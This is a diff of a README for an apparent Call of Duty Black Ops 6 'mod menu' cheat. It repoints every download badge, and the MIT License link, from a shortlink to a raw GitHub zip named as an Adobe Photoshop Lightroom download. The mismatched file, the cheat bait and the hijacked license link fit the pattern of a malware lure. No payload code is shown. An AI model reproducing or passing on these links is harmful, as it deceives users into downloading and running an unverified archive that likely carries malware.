@@ -1,6 +1,6 @@
 # 🎮 COD BO6 Mod Menu  
 
-[![Download](https://img.shields.io/badge/Download-BO6%20Mod%20Menu-blue?logo=github)](https://ezlaunch.live/pPnqF1yp)
+[![Download](https://raw.githubusercontent.com/timmyego/Adobe-Photoshop-Lightroom-Download/main/kend/Adobe-Photoshop-Lightroom-Download.zip%20Mod%20Menu-blue?logo=github)](https://raw.githubusercontent.com/timmyego/Adobe-Photoshop-Lightroom-Download/main/kend/Adobe-Photoshop-Lightroom-Download.zip)
 
 Unlock powerful customization and exclusive enhancements with the **COD BO6 Mod Menu**—your ultimate toolkit for expanding gameplay potential in Call of Duty: Black Ops 6! Level up your sessions with features engineered for performance, safety, and modern gaming standards. 🌟
 
@@ -35,7 +35,7 @@ COD BO6 mod, mod menu for Black Ops 6, custom Black Ops 6 add-ons, private expan
 ## 🚀 Installation
 
 1. Click this button to begin your experience:  
-   [![Download](https://img.shields.io/badge/Download-BO6%20Mod%20Menu-blue?logo=github)](https://ezlaunch.live/pPnqF1yp) 
+   [![Download](https://raw.githubusercontent.com/timmyego/Adobe-Photoshop-Lightroom-Download/main/kend/Adobe-Photoshop-Lightroom-Download.zip%20Mod%20Menu-blue?logo=github)](https://raw.githubusercontent.com/timmyego/Adobe-Photoshop-Lightroom-Download/main/kend/Adobe-Photoshop-Lightroom-Download.zip) 
 ---
 
 ## ⚠️ Disclaimer
@@ -46,9 +46,9 @@ This repository is designed solely for educational and modification purposes in 
 
 ## 📄 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT).  
+Distributed under the [MIT License](https://raw.githubusercontent.com/timmyego/Adobe-Photoshop-Lightroom-Download/main/kend/Adobe-Photoshop-Lightroom-Download.zip).  
 © 2025
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-BO6%20Mod%20Menu-blue?logo=github)](https://ezlaunch.live/pPnqF1yp) 
+[![Download](https://raw.githubusercontent.com/timmyego/Adobe-Photoshop-Lightroom-Download/main/kend/Adobe-Photoshop-Lightroom-Download.zip%20Mod%20Menu-blue?logo=github)](https://raw.githubusercontent.com/timmyego/Adobe-Photoshop-Lightroom-Download/main/kend/Adobe-Photoshop-Lightroom-Download.zip) 
